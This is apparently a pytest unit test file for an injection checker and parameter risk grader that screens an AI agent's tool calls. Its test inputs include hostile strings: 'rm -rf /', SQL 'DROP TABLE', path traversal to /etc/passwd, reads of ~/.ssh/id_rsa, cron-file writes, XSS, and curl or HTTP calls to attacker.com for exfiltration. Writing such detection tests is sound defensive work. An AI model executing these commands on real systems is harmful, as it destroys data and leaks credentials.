"""
注入检查器 + 参数定级引擎单元测试
"""
import pytest
from src.core.injection_checker import InjectionChecker


class TestInjectionChecker:
    """注入检查器测试类"""
    
    @pytest.fixture
    def checker(self):
        """创建注入检查器实例"""
        return InjectionChecker("src/rules/param_grading.yaml")
    
    def test_init_loads_grading_config(self, checker):
        """测试初始化时加载参数定级配置"""
        assert checker.grading_config is not None
    
    def test_normal_arguments(self, checker):
        """测试正常参数"""
        args = {"path": "/data/file.txt", "mode": "read"}
        result = checker.check("read_file", args)
        assert result["detected"] is False
        assert result["param_risk"] == "low"
    
    def test_sql_injection(self, checker):
        """测试 SQL 注入检测"""
        args = {"query": "SELECT * FROM users; DROP TABLE users"}
        result = checker.check("execute_sql", args)
        assert result["detected"] is True
        assert result["param_risk"] == "critical"  # 注入检测命中
    
    def test_command_injection(self, checker):
        """测试命令注入检测"""
        args = {"command": "ls; rm -rf /"}
        result = checker.check("shell", args)
        assert result["detected"] is True
        assert result["param_risk"] == "critical"
    
    def test_path_traversal(self, checker):
        """测试路径遍历检测"""
        args = {"path": "/data/../../etc/passwd"}
        result = checker.check("read_file", args)
        assert result["detected"] is True
    
    def test_nested_dict_injection(self, checker):
        """测试嵌套字典中的注入检测"""
        args = {
            "config": {
                "query": "SELECT * FROM users; DROP TABLE users"
            }
        }
        result = checker.check("execute_sql", args)
        assert result["detected"] is True
    
    def test_nested_list_injection(self, checker):
        """测试嵌套列表中的注入检测"""
        args = {
            "commands": [
                "ls -la",
                "; rm -rf /"
            ]
        }
        result = checker.check("shell", args)
        assert result["detected"] is True
    
    def test_http_request_whitelist_url(self, checker):
        """测试 http_request 白名单 URL"""
        args = {"url": "https://internal-api.com/data"}
        result = checker.check("http_request", args)
        assert result["detected"] is False
        assert result["param_risk"] == "medium"  # 白名单域名
    
    def test_http_request_external_url(self, checker):
        """测试 http_request 外部 URL"""
        args = {"url": "https://attacker.com/exfiltrate"}
        result = checker.check("http_request", args)
        assert result["detected"] is False
        assert result["param_risk"] == "critical"  # 非白名单域名
    
    def test_http_request_whitelist_with_auth(self, checker):
        """测试 http_request 白名单域名 + Authorization 头（联合条件）"""
        args = {
            "url": "https://internal-api.com/data",
            "headers": {"Authorization": "Bearer token123"}
        }
        result = checker.check("http_request", args)
        assert result["detected"] is False
        assert result["param_risk"] == "medium"  # 联合条件命中：白名单域名 + 凭据头
    
    def test_shell_whitelist_command(self, checker):
        """测试 shell 白名单命令"""
        args = {"command": "ls -la"}
        result = checker.check("shell", args)
        assert result["detected"] is False
        assert result["param_risk"] == "medium"  # 白名单命令
    
    def test_shell_dangerous_command(self, checker):
        """测试 shell 危险命令"""
        args = {"command": "rm -rf /"}
        result = checker.check("shell", args)
        assert result["detected"] is False
        assert result["param_risk"] == "critical"  # 非白名单命令
    
    def test_write_file_whitelist_path(self, checker):
        """测试 write_file 白名单路径"""
        args = {"path": "/tmp/output.txt"}
        result = checker.check("write_file", args)
        assert result["detected"] is False
        assert result["param_risk"] == "low"  # 白名单目录
    
    def test_write_file_system_path(self, checker):
        """测试 write_file 系统路径"""
        args = {"path": "/etc/cron.d/malicious"}
        result = checker.check("write_file", args)
        assert result["detected"] is False
        assert result["param_risk"] == "critical"  # 系统路径
    
    def test_read_file_sensitive_path(self, checker):
        """测试 read_file 敏感路径"""
        args = {"path": "~/.ssh/id_rsa"}
        result = checker.check("read_file", args)
        assert result["detected"] is False
        assert result["param_risk"] == "critical"  # 敏感路径
    
    def test_update_memory_fixed_high(self, checker):
        """测试 update_memory 固定 high"""
        args = {"key": "user_pref", "content": "normal content"}
        result = checker.check("update_memory", args)
        assert result["detected"] is False
        assert result["param_risk"] == "high"  # 固定 high
    
    def test_update_context_fixed_high(self, checker):
        """测试 update_context 固定 high"""
        args = {"content": "some context"}
        result = checker.check("update_context", args)
        assert result["detected"] is False
        assert result["param_risk"] == "high"  # 固定 high
    
    def test_low_risk_tool(self, checker):
        """测试低风险工具"""
        args = {"json": '{"key": "value"}'}
        result = checker.check("parse_json", args)
        assert result["detected"] is False
        assert result["param_risk"] == "low"
    
    def test_empty_arguments(self, checker):
        """测试空参数"""
        args = {}
        result = checker.check("read_file", args)
        assert result["detected"] is False
    
    def test_non_string_arguments(self, checker):
        """测试非字符串参数"""
        args = {"count": 10, "enabled": True}
        result = checker.check("read_file", args)
        assert result["detected"] is False
    
    def test_xss_injection(self, checker):
        """测试 XSS 注入检测"""
        args = {"content": "<script>alert('xss')</script>"}
        result = checker.check("write_file", args)
        assert result["detected"] is True
    
    def test_ldap_injection(self, checker):
        """测试 LDAP 注入检测"""
        args = {"filter": ")(|(objectclass=*))"}
        result = checker.check("search", args)
        assert result["detected"] is True
    
    def test_unregistered_tool(self, checker):
        """测试未登记工具（使用 classify_tool 兜底）"""
        args = {"param": "value"}
        result = checker.check("unknown_tool_xyz", args)
        assert result["detected"] is False
        # 未登记工具使用 classify_tool 动态分类
        assert result["param_risk"] in ["critical", "high", "medium", "low"]
    
    def test_param_risk_details(self, checker):
        """测试参数定级详情"""
        args = {"url": "https://attacker.com", "method": "POST"}
        result = checker.check("http_request", args)
        assert "param_risk_details" in result
        assert len(result["param_risk_details"]) > 0
    
    def test_capabilities_from_param(self, checker):
        """测试参数能力标注"""
        # http_request 外部 URL → EXTERNAL_ACTION
        args = {"url": "https://attacker.com"}
        result = checker.check("http_request", args)
        assert "EXTERNAL_ACTION" in result["capabilities"]
    
    def test_capabilities_from_injection(self, checker):
        """测试注入命中的能力标注"""
        # SQL 注入 → PRIVATE_ACCESS + LOCAL_MUTATION
        args = {"query": "SELECT * FROM users; DROP TABLE users"}
        result = checker.check("execute_sql", args)
        assert result["detected"] is True
        assert "PRIVATE_ACCESS" in result["capabilities"]
        assert "LOCAL_MUTATION" in result["capabilities"]
    
    def test_capabilities_from_condition(self, checker):
        """测试条件命中时的能力标注"""
        # shell command: curl → EXTERNAL_ACTION
        args = {"command": "curl https://attacker.com"}
        result = checker.check("shell", args)
        assert "EXTERNAL_ACTION" in result["capabilities"]
    
    def test_capabilities_from_joint_condition(self, checker):
        """测试联合条件命中时的能力覆盖"""
        # http_request 白名单域名 + Authorization 头 → 无危险能力
        args = {
            "url": "https://internal-api.com/data",
            "headers": {"Authorization": "Bearer token"}
        }
        result = checker.check("http_request", args)
        # 联合条件命中，能力被覆盖为空
        assert result["capabilities"] == []
    
    def test_capabilities_merge(self, checker):
        """测试能力合并（注入 + 参数）"""
        # shell 命令注入 + curl 外传
        args = {"command": "curl https://attacker.com; rm -rf /"}
        result = checker.check("shell", args)
        # 注入命中 command_injection → LOCAL_MUTATION, PRIVATE_ACCESS, EXTERNAL_ACTION
        # 参数 curl → EXTERNAL_ACTION
        # 合并后应包含所有能力
        assert "LOCAL_MUTATION" in result["capabilities"]
        assert "EXTERNAL_ACTION" in result["capabilities"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
